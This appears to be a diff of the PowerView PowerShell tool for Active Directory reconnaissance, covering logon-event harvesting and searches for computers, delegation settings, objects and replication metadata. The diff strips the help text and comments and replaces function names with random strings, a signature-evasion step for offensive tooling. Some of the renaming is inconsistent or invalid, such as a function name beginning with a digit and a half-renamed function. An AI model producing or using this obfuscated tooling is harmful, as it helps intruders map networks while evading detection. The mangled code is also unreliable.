-Required Dependencies: None  
-
-.DESCRIPTION
-
-This function uses an XML path filter passed to Get-WinEvent to retrieve
-security events with IDs of 4624 (logon events) or 4648 (explicit credential
-logon events) from -StartTime (default of now-1 day) to -EndTime (default of now).
-A maximum of -MaxEvents (default of 5000) are returned.
-
-.PARAMETER ComputerName
-
-Specifies the computer name to retrieve events from, default of localhost.
-
-.PARAMETER StartTime
-
-The [DateTime] object representing the start of when to collect events.
-Default of [DateTime]::Now.AddDays(-1).
-
-.PARAMETER EndTime
-
-The [DateTime] object representing the end of when to collect events.
-Default of [DateTime]::Now.
-
-.PARAMETER MaxEvents
-
-The maximum number of events to retrieve. Default of 5000.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target computer.
-
-.EXAMPLE
-
-Get-DomainUserEvent
-
-Return logon events on the local machine.
-
-.EXAMPLE
-
-Get-DomainController | Get-DomainUserEvent -StartTime ([DateTime]::Now.AddDays(-3))
-
-Return all logon events from the last 3 days from every domain controller in the current domain.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-DomainUserEvent -ComputerName PRIMARY.testlab.local -Credential $Cred -MaxEvents 1000
-
-Return a max of 1000 logon events from the specified machine using the specified alternate credentials.
-
-.OUTPUTS
-
-PowerView.LogonEvent
-
-PowerView.ExplicitCredentialLogonEvent
-
-.LINK
-
-http://www.sixdub.net/2014/11/07/offensive-event-parsing-bringing-home-trophies/
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.LogonEvent')]
@@ -5657,7 +3345,7 @@ http://www.sixdub.net/2014/11/07/offensive-event-parsing-bringing-home-trophies/
     )
 
     BEGIN {
-        # the XML filter we're passing to Get-WinEvent
+        
         $XPathFilter = @"
 <QueryList>
     <Query Id="0" Path="Security">
@@ -5737,9 +3425,9 @@ http://www.sixdub.net/2014/11/07/offensive-event-parsing-bringing-home-trophies/
                 $Event = $_
                 $Properties = $Event.Properties
                 Switch ($Event.Id) {
-                    # logon event
+                    
                     4624 {
-                        # skip computer logons, for now...
+                        
                         if(-not $Properties[5].Value.EndsWith('$')) {
                             $Output = New-Object PSObject -Property @{
                                 ComputerName              = $Computer
@@ -5778,9 +3466,9 @@ http://www.sixdub.net/2014/11/07/offensive-event-parsing-bringing-home-trophies/
                         }
                     }
 
-                    # logon with explicit credential
+                    
                     4648 {
-                        # skip computer logons, for now...
+                        
                         if((-not $Properties[5].Value.EndsWith('$')) -and ($Properties[11].Value -match 'taskhost\.exe')) {
                             $Output = New-Object PSObject -Property @{
                                 ComputerName              = $Computer
@@ -5815,56 +3503,8 @@ http://www.sixdub.net/2014/11/07/offensive-event-parsing-bringing-home-trophies/
 }
 
 
-function Get-DomainGUIDMap {
-<#
-.SYNOPSIS
+function KV9HMWD4 {
 
-Helper to build a hash table of [GUID] -> resolved names for the current or specified Domain.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-DomainSearcher, Get-Forest  
-
-.DESCRIPTION
-
-Searches the forest schema location (CN=Schema,CN=Configuration,DC=testlab,DC=local) for
-all objects with schemaIDGUID set and translates the GUIDs discovered to human-readable names.
-Then searches the extended rights location (CN=Extended-Rights,CN=Configuration,DC=testlab,DC=local)
-for objects where objectClass=controlAccessRight, translating the GUIDs again.
-
-Heavily adapted from http://blogs.technet.com/b/ashleymcglone/archive/2013/03/25/active-directory-ou-permissions-report-free-powershell-script-download.aspx
-
-.PARAMETER Domain
-
-Specifies the domain to use for the query, defaults to the current domain.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.OUTPUTS
-
-Hashtable
-
-Ouputs a hashtable containing a GUID -> Readable Name mapping.
-
-.LINK
-
-http://blogs.technet.com/b/ashleymcglone/archive/2013/03/25/active-directory-ou-permissions-report-free-powershell-script-download.aspx
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType([Hashtable])]
@@ -5901,10 +3541,10 @@ http://blogs.technet.com/b/ashleymcglone/archive/2013/03/25/active-directory-ou-
         $SchemaPath = (Get-Forest @ForestArguments).schema.name
     }
     catch {
-        throw '[Get-DomainGUIDMap] Error in retrieving forest schema path from Get-Forest'
+        throw '[KV9HMWD4] Error in retrieving forest schema path from Get-Forest'
     }
     if (-not $SchemaPath) {
-        throw '[Get-DomainGUIDMap] Error in retrieving forest schema path from Get-Forest'
+        throw '[KV9HMWD4] Error in retrieving forest schema path from Get-Forest'
     }
 
     $SearcherArguments = @{
@@ -5916,7 +3556,7 @@ http://blogs.technet.com/b/ashleymcglone/archive/2013/03/25/active-directory-ou-
     if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
     if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
     if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
-    $SchemaSearcher = Get-DomainSearcher @SearcherArguments
+    $SchemaSearcher = NJUXTHTL @SearcherArguments
 
     if ($SchemaSearcher) {
         try {
@@ -5927,19 +3567,19 @@ http://blogs.technet.com/b/ashleymcglone/archive/2013/03/25/active-directory-ou-
             if ($Results) {
                 try { $Results.dispose() }
                 catch {
-                    Write-Verbose "[Get-DomainGUIDMap] Error disposing of the Results object: $_"
+                    Write-Verbose "[KV9HMWD4] Error disposing of the Results object: $_"
                 }
             }
             $SchemaSearcher.dispose()
         }
         catch {
-            Write-Verbose "[Get-DomainGUIDMap] Error in building GUID map: $_"
+            Write-Verbose "[KV9HMWD4] Error in building GUID map: $_"
         }
     }
 
     $SearcherArguments['SearchBase'] = $SchemaPath.replace('Schema','Extended-Rights')
     $SearcherArguments['LDAPFilter'] = '(objectClass=controlAccessRight)'
-    $RightsSearcher = Get-DomainSearcher @SearcherArguments
+    $RightsSearcher = NJUXTHTL @SearcherArguments
 
     if ($RightsSearcher) {
         try {
@@ -5950,13 +3590,13 @@ http://blogs.technet.com/b/ashleymcglone/archive/2013/03/25/active-directory-ou-
             if ($Results) {
                 try { $Results.dispose() }
                 catch {
-                    Write-Verbose "[Get-DomainGUIDMap] Error disposing of the Results object: $_"
+                    Write-Verbose "[KV9HMWD4] Error disposing of the Results object: $_"
                 }
             }
             $RightsSearcher.dispose()
         }
         catch {
-            Write-Verbose "[Get-DomainGUIDMap] Error in building GUID map: $_"
+            Write-Verbose "[KV9HMWD4] Error in building GUID map: $_"
         }
     }
 
@@ -5964,162 +3604,8 @@ http://blogs.technet.com/b/ashleymcglone/archive/2013/03/25/active-directory-ou-
 }
 
 
-function Get-DomainComputer {
-<#
-.SYNOPSIS
+function VVVCIHJ3 {
 
-Return all computers or specific computer objects in AD.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty  
-
-.DESCRIPTION
-
-Builds a directory searcher object using Get-DomainSearcher, builds a custom
-LDAP filter based on targeting/filter parameters, and searches for all objects
-matching the criteria. To only return specific properties, use
-"-Properties samaccountname,usnchanged,...". By default, all computer objects for
-the current domain are returned.
-
-.PARAMETER Identity
-
-A SamAccountName (e.g. WINDOWS10$), DistinguishedName (e.g. CN=WINDOWS10,CN=Computers,DC=testlab,DC=local),
-SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1124), GUID (e.g. 4f16b6bc-7010-4cbf-b628-f3cfe20f6994),
-or a dns host name (e.g. windows10.testlab.local). Wildcards accepted.
-
-.PARAMETER UACFilter
-
-Dynamic parameter that accepts one or more values from $UACEnum, including
-"NOT_X" negation forms. To see all possible values, run '0|ConvertFrom-UACValue -ShowAll'.
-
-.PARAMETER Unconstrained
-
-Switch. Return computer objects that have unconstrained delegation.
-
-.PARAMETER TrustedToAuth
-
-Switch. Return computer objects that are trusted to authenticate for other principals.
-
-.PARAMETER Printers
-
-Switch. Return only printers.
-
-.PARAMETER SPN
-
-Return computers with a specific service principal name, wildcards accepted.
-
-.PARAMETER OperatingSystem
-
-Return computers with a specific operating system, wildcards accepted.
-
-.PARAMETER ServicePack
-
-Return computers with a specific service pack, wildcards accepted.
-
-.PARAMETER SiteName
-
-Return computers in the specific AD Site name, wildcards accepted.
-
-.PARAMETER Ping
-
-Switch. Ping each host to ensure it's up before enumerating.
-
-.PARAMETER Domain
-
-Specifies the domain to use for the query, defaults to the current domain.
-
-.PARAMETER LDAPFilter
-
-Specifies an LDAP query string that is used to filter Active Directory objects.
-
-.PARAMETER Properties
-
-Specifies the properties of the output object to retrieve from the server.
-
-.PARAMETER SearchBase
-
-The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-Useful for OU queries.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER SearchScope
-
-Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER SecurityMasks
-
-Specifies an option for examining security information of a directory object.
-One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.
-
-.PARAMETER Tombstone
-
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-
-.PARAMETER FindOne
-
-Only return one result object.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.PARAMETER Raw
-
-Switch. Return raw results instead of translating the fields into a custom PSObject.
-
-.EXAMPLE
-
-Get-DomainComputer
-
-Returns the current computers in current domain.
-
-.EXAMPLE
-
-Get-DomainComputer -SPN mssql* -Domain testlab.local
-
-Returns all MS SQL servers in the testlab.local domain.
-
-.EXAMPLE
-
-Get-DomainComputer -UACFilter TRUSTED_FOR_DELEGATION,SERVER_TRUST_ACCOUNT -Properties dnshostname
-
-Return the dns hostnames of servers trusted for delegation.
-
-.EXAMPLE
-
-Get-DomainComputer -SearchBase "LDAP://OU=secret,DC=testlab,DC=local" -Unconstrained
-
-Search the specified OU for computeres that allow unconstrained delegation.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-DomainComputer -Credential $Cred
-
-.OUTPUTS
-
-PowerView.Computer
-
-Custom PSObject with translated computer property fields.
-
-PowerView.Computer.Raw
-
-The raw DirectoryServices.SearchResult object, if -Raw is enabled.
-#>
 
     [OutputType('PowerView.Computer')]
     [OutputType('PowerView.Computer.Raw')]
@@ -6215,10 +3701,10 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
 
     DynamicParam {
         $UACValueNames = [Enum]::GetNames($UACEnum)
-        # add in the negations
+        
         $UACValueNames = $UACValueNames | ForEach-Object {$_; "NOT_$_"}
-        # create new dynamic parameter
-        New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
+        
+        1FN2NPRI -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
     }
 
     BEGIN {
@@ -6233,13 +3719,13 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
         if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
         if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
         if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
-        $CompSearcher = Get-DomainSearcher @SearcherArguments
+        $CompSearcher = NJUXTHTL @SearcherArguments
     }
 
     PROCESS {
-        #bind dynamic parameter to a friendly variable
+        
         if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
-            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
+            1FN2NPRI -CreateVariables -BoundParameters $PSBoundParameters
         }
 
         if ($CompSearcher) {
@@ -6253,14 +3739,14 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
                 elseif ($IdentityInstance -match '^CN=') {
                     $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                     if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
-                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
-                        #   and rebuild the domain searcher
+                        
+                        
                         $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
-                        Write-Verbose "[Get-DomainComputer] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
+                        Write-Verbose "[VVVCIHJ3] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                         $SearcherArguments['Domain'] = $IdentityDomain
-                        $CompSearcher = Get-DomainSearcher @SearcherArguments
+                        $CompSearcher = NJUXTHTL @SearcherArguments
                         if (-not $CompSearcher) {
-                            Write-Warning "[Get-DomainComputer] Unable to retrieve domain searcher for '$IdentityDomain'"
+                            Write-Warning "[VVVCIHJ3] Unable to retrieve domain searcher for '$IdentityDomain'"
                         }
                     }
                 }
@@ -6280,38 +3766,38 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
             }
 
             if ($PSBoundParameters['Unconstrained']) {
-                Write-Verbose '[Get-DomainComputer] Searching for computers with for unconstrained delegation'
+                Write-Verbose '[VVVCIHJ3] Searching for computers with for unconstrained delegation'
                 $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
             }
             if ($PSBoundParameters['TrustedToAuth']) {
-                Write-Verbose '[Get-DomainComputer] Searching for computers that are trusted to authenticate for other principals'
+                Write-Verbose '[VVVCIHJ3] Searching for computers that are trusted to authenticate for other principals'
                 $Filter += '(msds-allowedtodelegateto=*)'
             }
             if ($PSBoundParameters['Printers']) {
-                Write-Verbose '[Get-DomainComputer] Searching for printers'
+                Write-Verbose '[VVVCIHJ3] Searching for printers'
                 $Filter += '(objectCategory=printQueue)'
             }
             if ($PSBoundParameters['SPN']) {
-                Write-Verbose "[Get-DomainComputer] Searching for computers with SPN: $SPN"
+                Write-Verbose "[VVVCIHJ3] Searching for computers with SPN: $SPN"
                 $Filter += "(servicePrincipalName=$SPN)"
             }
             if ($PSBoundParameters['OperatingSystem']) {
-                Write-Verbose "[Get-DomainComputer] Searching for computers with operating system: $OperatingSystem"
+                Write-Verbose "[VVVCIHJ3] Searching for computers with operating system: $OperatingSystem"
                 $Filter += "(operatingsystem=$OperatingSystem)"
             }
             if ($PSBoundParameters['ServicePack']) {
-                Write-Verbose "[Get-DomainComputer] Searching for computers with service pack: $ServicePack"
+                Write-Verbose "[VVVCIHJ3] Searching for computers with service pack: $ServicePack"
                 $Filter += "(operatingsystemservicepack=$ServicePack)"
             }
             if ($PSBoundParameters['SiteName']) {
-                Write-Verbose "[Get-DomainComputer] Searching for computers with site name: $SiteName"
+                Write-Verbose "[VVVCIHJ3] Searching for computers with site name: $SiteName"
                 $Filter += "(serverreferencebl=$SiteName)"
             }
             if ($PSBoundParameters['LDAPFilter']) {
-                Write-Verbose "[Get-DomainComputer] Using additional LDAP filter: $LDAPFilter"
+                Write-Verbose "[VVVCIHJ3] Using additional LDAP filter: $LDAPFilter"
                 $Filter += "$LDAPFilter"
             }
-            # build the LDAP filter for the dynamic UAC filter value
+            
             $UACFilter | Where-Object {$_} | ForEach-Object {
                 if ($_ -match 'NOT_.*') {
                     $UACField = $_.Substring(4)
@@ -6325,7 +3811,7 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
             }
 
             $CompSearcher.filter = "(&(samAccountType=805306369)$Filter)"
-            Write-Verbose "[Get-DomainComputer] Get-DomainComputer filter string: $($CompSearcher.filter)"
+            Write-Verbose "[VVVCIHJ3] VVVCIHJ3 filter string: $($CompSearcher.filter)"
 
             if ($PSBoundParameters['FindOne']) { $Results = $CompSearcher.FindOne() }
             else { $Results = $CompSearcher.FindAll() }
@@ -6336,7 +3822,7 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
                 }
                 if ($Up) {
                     if ($PSBoundParameters['Raw']) {
-                        # return raw result objects
+                        
                         $Computer = $_
                         $Computer.PSObject.TypeNames.Insert(0, 'PowerView.Computer.Raw')
                     }
@@ -6350,7 +3836,7 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
             if ($Results) {
                 try { $Results.dispose() }
                 catch {
-                    Write-Verbose "[Get-DomainComputer] Error disposing of the Results object: $_"
+                    Write-Verbose "[VVVCIHJ3] Error disposing of the Results object: $_"
                 }
             }
             $CompSearcher.dispose()
@@ -6359,142 +3845,8 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
 }
 
 
-function Get-DomainObject {
-<#
-.SYNOPSIS
+function U3GGBSG9 {
 
-Return all (or specified) domain objects in AD.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty, Convert-ADName  
-
-.DESCRIPTION
-
-Builds a directory searcher object using Get-DomainSearcher, builds a custom
-LDAP filter based on targeting/filter parameters, and searches for all objects
-matching the criteria. To only return specific properties, use
-"-Properties samaccountname,usnchanged,...". By default, all objects for
-the current domain are returned.
-
-.PARAMETER Identity
-
-A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
-SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
-Wildcards accepted.
-
-.PARAMETER UACFilter
-
-Dynamic parameter that accepts one or more values from $UACEnum, including
-"NOT_X" negation forms. To see all possible values, run '0|ConvertFrom-UACValue -ShowAll'.
-
-.PARAMETER Domain
-
-Specifies the domain to use for the query, defaults to the current domain.
-
-.PARAMETER LDAPFilter
-
-Specifies an LDAP query string that is used to filter Active Directory objects.
-
-.PARAMETER Properties
-
-Specifies the properties of the output object to retrieve from the server.
-
-.PARAMETER SearchBase
-
-The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-Useful for OU queries.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER SearchScope
-
-Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER SecurityMasks
-
-Specifies an option for examining security information of a directory object.
-One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.
-
-.PARAMETER Tombstone
-
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-
-.PARAMETER FindOne
-
-Only return one result object.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.PARAMETER Raw
-
-Switch. Return raw results instead of translating the fields into a custom PSObject.
-
-.EXAMPLE
-
-Get-DomainObject -Domain testlab.local
-
-Return all objects for the testlab.local domain
-
-.EXAMPLE
-
-'S-1-5-21-890171859-3433809279-3366196753-1003', 'CN=dfm,CN=Users,DC=testlab,DC=local','b6a9a2fb-bbd5-4f28-9a09-23213cea6693','dfm.a' | Get-DomainObject -Properties distinguishedname
-
-distinguishedname
------------------
-CN=PRIMARY,OU=Domain Controllers,DC=testlab,DC=local
-CN=dfm,CN=Users,DC=testlab,DC=local
-OU=OU3,DC=testlab,DC=local
-CN=dfm (admin),CN=Users,DC=testlab,DC=local
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-DomainObject -Credential $Cred -Identity 'windows1'
-
-.EXAMPLE
-
-Get-Domain | Select-Object -Expand name
-testlab.local
-
-'testlab\harmj0y','DEV\Domain Admins' | Get-DomainObject -Verbose -Properties distinguishedname
-VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
-VERBOSE: [Get-DomainUser] Extracted domain 'testlab.local' from 'testlab\harmj0y'
-VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
-VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(samAccountName=harmj0y)))
-
-distinguishedname
------------------
-CN=harmj0y,CN=Users,DC=testlab,DC=local
-VERBOSE: [Get-DomainUser] Extracted domain 'dev.testlab.local' from 'DEV\Domain Admins'
-VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
-VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(samAccountName=Domain Admins)))
-CN=Domain Admins,CN=Users,DC=dev,DC=testlab,DC=local
-
-.OUTPUTS
-
-PowerView.ADObject
-
-Custom PSObject with translated AD object property fields.
-
-PowerView.ADObject.Raw
-
-The raw DirectoryServices.SearchResult object, if -Raw is enabled.
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
     [OutputType('PowerView.ADObject')]
@@ -6562,10 +3914,10 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
 
     DynamicParam {
         $UACValueNames = [Enum]::GetNames($UACEnum)
-        # add in the negations
+        
         $UACValueNames = $UACValueNames | ForEach-Object {$_; "NOT_$_"}
-        # create new dynamic parameter
-        New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
+        
+        1FN2NPRI -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
     }
 
     BEGIN {
@@ -6580,13 +3932,13 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
         if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
         if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
         if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
-        $ObjectSearcher = Get-DomainSearcher @SearcherArguments
+        $ObjectSearcher = NJUXTHTL @SearcherArguments
     }
 
     PROCESS {
-        #bind dynamic parameter to a friendly variable
+        
         if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
-            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
+            1FN2NPRI -CreateVariables -BoundParameters $PSBoundParameters
         }
         if ($ObjectSearcher) {
             $IdentityFilter = ''
@@ -6599,14 +3951,14 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
                 elseif ($IdentityInstance -match '^(CN|OU|DC)=') {
                     $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                     if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
-                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
-                        #   and rebuild the domain searcher
+                        
+                        
                         $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
-                        Write-Verbose "[Get-DomainObject] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
+                        Write-Verbose "[U3GGBSG9] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                         $SearcherArguments['Domain'] = $IdentityDomain
-                        $ObjectSearcher = Get-DomainSearcher @SearcherArguments
+                        $ObjectSearcher = NJUXTHTL @SearcherArguments
                         if (-not $ObjectSearcher) {
-                            Write-Warning "[Get-DomainObject] Unable to retrieve domain searcher for '$IdentityDomain'"
+                            Write-Warning "[U3GGBSG9] Unable to retrieve domain searcher for '$IdentityDomain'"
                         }
                     }
                 }
@@ -6621,8 +3973,8 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
                         $ObjectName = $IdentityInstance.Split('\')[1]
                         $IdentityFilter += "(samAccountName=$ObjectName)"
                         $SearcherArguments['Domain'] = $ObjectDomain
-                        Write-Verbose "[Get-DomainObject] Extracted domain '$ObjectDomain' from '$IdentityInstance'"
-                        $ObjectSearcher = Get-DomainSearcher @SearcherArguments
+                        Write-Verbose "[U3GGBSG9] Extracted domain '$ObjectDomain' from '$IdentityInstance'"
+                        $ObjectSearcher = NJUXTHTL @SearcherArguments
                     }
                 }
                 elseif ($IdentityInstance.Contains('.')) {
@@ -6637,11 +3989,11 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
             }
 
             if ($PSBoundParameters['LDAPFilter']) {
-                Write-Verbose "[Get-DomainObject] Using additional LDAP filter: $LDAPFilter"
+                Write-Verbose "[U3GGBSG9] Using additional LDAP filter: $LDAPFilter"
                 $Filter += "$LDAPFilter"
             }
 
-            # build the LDAP filter for the dynamic UAC filter value
+            
             $UACFilter | Where-Object {$_} | ForEach-Object {
                 if ($_ -match 'NOT_.*') {
                     $UACField = $_.Substring(4)
@@ -6657,13 +4009,13 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
             if ($Filter -and $Filter -ne '') {
                 $ObjectSearcher.filter = "(&$Filter)"
             }
-            Write-Verbose "[Get-DomainObject] Get-DomainObject filter string: $($ObjectSearcher.filter)"
+            Write-Verbose "[U3GGBSG9] U3GGBSG9 filter string: $($ObjectSearcher.filter)"
 
             if ($PSBoundParameters['FindOne']) { $Results = $ObjectSearcher.FindOne() }
             else { $Results = $ObjectSearcher.FindAll() }
             $Results | Where-Object {$_} | ForEach-Object {
                 if ($PSBoundParameters['Raw']) {
-                    # return raw result objects
+                    
                     $Object = $_
                     $Object.PSObject.TypeNames.Insert(0, 'PowerView.ADObject.Raw')
                 }
@@ -6676,7 +4028,7 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
             if ($Results) {
                 try { $Results.dispose() }
                 catch {
-                    Write-Verbose "[Get-DomainObject] Error disposing of the Results object: $_"
+                    Write-Verbose "[U3GGBSG9] Error disposing of the Results object: $_"
                 }
             }
             $ObjectSearcher.dispose()
@@ -6685,112 +4037,8 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
 }
 
 
-function Get-DomainObjectAttributeHistory {
-<#
-.SYNOPSIS
+function U3GGBSG9AttributeHistory {
 
-Returns the Active Directory attribute replication metadata for the specified
-object, i.e. a parsed version of the msds-replattributemetadata attribute.
-By default, replication data for every domain object is returned.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-DomainObject
-
-.DESCRIPTION
-
-Wraps Get-DomainObject with a specification to retrieve the property 'msds-replattributemetadata'.
-This is the domain attribute replication metadata associated with the object. The results are
-parsed from their XML string form and returned as a custom object.
-
-.PARAMETER Identity
-
-A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
-SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
-Wildcards accepted.
-
-.PARAMETER Domain
-
-Specifies the domain to use for the query, defaults to the current domain.
-
-.PARAMETER LDAPFilter
-
-Specifies an LDAP query string that is used to filter Active Directory objects.
-
-.PARAMETER Properties
-
-Only return replication metadata on the specified property names.
-
-.PARAMETER SearchBase
-
-The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-Useful for OU queries.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER SearchScope
-
-Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER Tombstone
-
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.EXAMPLE
-
-Get-DomainObjectAttributeHistory -Domain testlab.local
-
-Return all attribute replication metadata for all objects in the testlab.local domain.
-
-.EXAMPLE
-
-'S-1-5-21-883232822-274137685-4173207997-1109','CN=dfm.a,CN=Users,DC=testlab,DC=local','da','94299db1-e3e7-48f9-845b-3bffef8bedbb' | Get-DomainObjectAttributeHistory -Properties objectClass | ft
-
-ObjectDN      ObjectGuid    AttributeNam LastOriginat Version      LastOriginat
-                            e            ingChange                 ingDsaDN
---------      ----------    ------------ ------------ -------      ------------
-CN=dfm.a,C... a6263874-f... objectClass  2017-03-0... 1            CN=NTDS S...
-CN=DA,CN=U... 77b56df4-f... objectClass  2017-04-1... 1            CN=NTDS S...
-CN=harmj0y... 94299db1-e... objectClass  2017-03-0... 1            CN=NTDS S...
-
-.EXAMPLE
-
-Get-DomainObjectAttributeHistory harmj0y -Properties userAccountControl
-
-ObjectDN              : CN=harmj0y,CN=Users,DC=testlab,DC=local
-ObjectGuid            : 94299db1-e3e7-48f9-845b-3bffef8bedbb
-AttributeName         : userAccountControl
-LastOriginatingChange : 2017-03-07T19:56:27Z
-Version               : 4
-LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
-                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
-                        l
-
-.OUTPUTS
-
-PowerView.ADObjectAttributeHistory
-
-Custom PSObject with translated replication metadata fields.
-
-.LINK
